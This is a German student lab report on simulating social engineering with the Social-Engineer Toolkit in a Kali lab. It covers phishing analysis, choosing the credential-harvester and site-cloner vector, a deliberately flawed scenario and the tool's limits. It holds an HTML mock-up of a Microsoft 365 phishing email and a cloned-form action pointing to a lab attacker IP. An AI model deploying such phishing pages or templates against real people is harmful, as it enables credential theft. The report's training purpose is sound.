==========================================================
Laborbericht: Social Engineering mit dem SET (Maverick)
==========================================================

Einleitung
----------
Dieser Bericht dokumentiert die Bearbeitung von vier Aufgaben zum Thema Social Engineering unter Verwendung des Social-Engineer Toolkits (SET) in der Version 8.0.3 'Maverick'.

Aufgabe 1: Angriff erkennen, bevor er passiert
----------------------------------------------

**Situation:**
Ein Mitarbeiter erhält eine E-Mail mit dem Betreff „Dringend: Sicherheitsüberprüfung Microsoft 365“. Die E-Mail ist sprachlich korrekt, enthält ein Firmenlogo und verweist auf eine Login-Seite.

**Arbeitsauftrag:**
* Ordnen Sie den Angriff eindeutig einer oder mehreren Social-Engineering-Techniken zu.
* Markieren Sie mindestens drei Angriffsmuster (Vertrauen, Zeitdruck usw.), die hier angewendet werden.
* Begründen Sie, warum diese E-Mail trotz MFA gefährlich ist.

**Lösung:**

1. **Zuordnung der Techniken:** Es handelt sich um **Spear-Phishing** (gezielte E-Mail) und **Pretexting** (Erschaffen eines glaubwürdigen Szenarios einer Sicherheitsüberprüfung).
2. **Angriffsmuster:**
   * **Zeitdruck (Urgency):** Das Wort „Dringend“ soll schnelles Handeln provozieren.
   * **Autorität / Vertrauen:** Die Nutzung des Microsoft-Logos und des IT-Kontexts suggeriert eine offizielle Anweisung.
   * **Angst:** Die Drohung einer Kontosperrung setzt das Opfer unter Druck.
3. **Gefahr trotz MFA:**
   Angreifer nutzen **Adversary-in-the-Middle (AiTM)** Proxies, um Anmeldedaten und das MFA-Token in Echtzeit abzufangen. Zudem kann **MFA-Fatigue** (Überflutung mit Anfragen) den Nutzer zur unbedachten Bestätigung verleiten.

[Image of an Adversary-in-the-Middle (AiTM) attack flowchart]

.. raw:: html

    <div style="font-family: 'Segoe UI', sans-serif; background-color: #f4f4f4; padding: 20px; border: 1px solid #ccc; max-width: 600px; margin: 20px 0;">
        <div style="background-color: #2b579a; color: white; padding: 15px;">
            <strong style="font-size: 18px;">Microsoft 365 Sicherheitsteam</strong>
        </div>
        <div style="background: white; padding: 20px; color: #333;">
            <p><strong>Von:</strong> IT-Security &lt;admin@ms-security-check.com&gt;</p>
            <p><strong>Betreff:</strong> <span style="color: red; font-weight: bold;">DRINGEND:</span> Sicherheitsüberprüfung erforderlich</p>
            <hr>
            <p>Sehr geehrter Mitarbeiter,</p>
            <p>Aufgrund ungewöhnlicher Aktivitäten wurde Ihr Konto gesperrt. Bitte verifizieren Sie Ihre Identität innerhalb der nächsten <strong>2 Stunden</strong>.</p>
            <div style="text-align: center; margin: 30px 0;">
                <a href="#" style="background-color: #2b579a; color: white; padding: 12px 25px; text-decoration: none; font-weight: bold;">Identität jetzt bestätigen</a>
            </div>
        </div>
    </div>

Aufgabe 2: SET gezielt einsetzen
---------------------------------

**Situation:**
Sie sollen den vermuteten Angriff in einer Laborumgebung mit Kali Linux nachvollziehbar simulieren.

**Arbeitsauftrag:**
* Welcher SET-Angriffsvektor eignet sich für dieses Szenario am besten?
* Begründen Sie Ihre Wahl gegen mindestens zwei andere mögliche Vektoren.
* Beschreiben Sie konzeptionell, wie SET eingesetzt wird, um Vertrauen zu erzeugen, eine Handlung auszulösen und Daten abzufragen.

**Lösung:**

1. **Wahl des Vektors:** Der **Website Attack Vector** (Option 2) mit der **Credential Harvester Method** (Option 3) und dem **Site Cloner** (Option 2).
2. **Begründung:**
   * Gegenüber dem **Java Applet Attack Vector** ist diese Methode "geräuschlos", da keine Bestätigung zur Ausführung von Code nötig ist.
   * Gegenüber dem **Infectious Media Generator** ist dieser Vektor remote einsetzbar und benötigt keinen physischen Zugriff.
3. **Konzeptioneller Einsatz:**
   * **Vertrauen:** Durch das bitgenaue Klonen der Zielseite (z. B. Microsoft 365).
   * **Handlung:** Durch Pretexting in der E-Mail, das den User auf die geklonte Seite führt.
   * **Datenabfrage:** SET fängt die HTTP-POST-Daten ab und zeigt sie im Terminal an.

[Image of Social-Engineer Toolkit (SET) credential harvester terminal output]

.. important::

   **Labor-Erkenntnis:** Das automatische Klonen von *Microsoft 365* oder *Digitec* scheiterte im Test aufgrund von **Content Security Policies (CSP)** und dynamischem JavaScript. Der Erfolg konnte jedoch durch das Klonen einer einfacheren Testseite (VulnWeb) nachgewiesen werden, wobei die Formular-Aktion erfolgreich auf die Angreifer-IP umgeschrieben wurde:
   ``<form action="http://192.168.110.70/userinfo.php">``

Aufgabe 3: SET scheitern lassen
-------------------------------

**Ausgangslage:**
Sie planen mit SET ein Social-Engineering-Szenario (z. B. Credential Harvester), dürfen es aber nicht erfolgreich durchführen.

**Arbeitsauftrag:**
* Beschreiben Sie ein SET-Szenario, das auf den ersten Blick glaubwürdig wirkt.
* Bauen Sie gezielt zwei Schwächen in das Szenario ein, sodass ein aufmerksamer Benutzer den Angriff erkennen könnte.
* Begründen Sie, welche Sicherheitskompetenz beim Benutzer dadurch gefördert wird.

**Lösung:**

* **Szenario:** Eine E-Mail der IT zur Passwort-Synchronisation.
* **Schwäche 1 (URL):** Der Link zeigt die rohe IP ``http://192.168.110.70/`` anstatt einer offiziellen Domain.
* **Schwäche 2 (Verschlüsselung):** Die Seite wird über unverschlüsseltes HTTP ausgeliefert, was zur Browserwarnung "Nicht sicher" führt.
* **Sicherheitskompetenz:** Förderung der **technischen Wachsamkeit**. Der Nutzer lernt, Indikatoren in der Adresszeile (URL, SSL) höher zu bewerten als das visuelle Design.

[Image of a web browser showing an 'Insecure Connection' warning in the address bar]

Aufgabe 4: SET vs. real-world
------------------------------

**Situation:**
Ein Studierender sagt: „Mit SET kann man doch alle Social-Engineering-Angriffe simulieren.“

**Arbeitsauftrag:**
* Nennen Sie zwei Arten von Social-Engineering-Angriffen, die SET nur unzureichend oder gar nicht abbilden kann.
* Begründen Sie jeweils warum SET hier an Grenzen stösst.

**Lösung:**

1. **Physisches Social Engineering (z. B. Tailgating):** SET ist ein digitales Tool und kann keine physische Präsenz, Körpersprache oder die Manipulation von Personen vor Ort (z. B. Zutritt zu Gebäuden) simulieren.
2. **Deepfake-Vishing / Video-Phishing:** Angriffe, die auf KI-generierter Echtzeit-Stimmenmanipulation basieren, liegen ausserhalb des Funktionsumfangs von SET, da dieses keine generativen KI-Schnittstellen für Audio/Video besitzt.
